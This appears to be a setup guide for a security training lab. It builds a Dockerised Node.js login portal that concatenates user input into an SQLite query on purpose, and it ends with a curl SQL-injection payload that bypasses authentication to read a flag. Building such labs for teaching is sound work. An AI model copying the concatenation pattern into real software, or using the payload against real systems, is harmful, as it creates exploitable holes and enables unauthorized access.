# SQL Injection Authentication Bypass

## Overview
A login portal vulnerable to classic SQL injection via SQLite.

## Architecture
- **Backend**: Node.js + Express
- **Database**: SQLite (via `better-sqlite3`)
- **Vulnerability**: Raw string concatenation in SQL query

## Phase 1: Docker/DB Files

```bash
cat << 'EOF' > docker-compose.yml
version: '3'
services:
  app:
    build: .
    container_name: app
    ports:
      - "3000:3000"
EOF
```

```bash
cat << 'EOF' > Dockerfile
FROM node:18
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["node", "app.js"]
EOF
```

## Phase 2: Dependencies

```bash
npm init -y && npm install express better-sqlite3
```

## Phase 3: Vulnerable App

```bash
cat << 'EOF' > app.js
const express = require('express');
const Database = require('better-sqlite3');

const db = new Database(':memory:');
db.exec("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, flag TEXT)");
db.exec("INSERT INTO users VALUES (1, 'admin', 'SuperSecretPass!2024', 'FLAG_PLACEHOLDER')");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    // VULNERABLE: Raw string concatenation
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    try {
        const user = db.prepare(query).get();
        if (user) return res.send("Welcome Admin! " + user.flag);
        return res.status(401).send("Invalid credentials");
    } catch (e) {
        return res.status(500).send("Error: " + e.message);
    }
});

app.listen(3000, '0.0.0.0', () => console.log('Listening on 0.0.0.0:3000'));
EOF
```

## Phase 4: Deploy
```bash
docker compose up -d --build
```

## Phase 5: Exploit
```bash
curl -s -X POST http://localhost:3000/login -H "Content-Type: application/json" -d '{"username": "admin'\'' OR 1=1 --", "password": "anything"}'
```
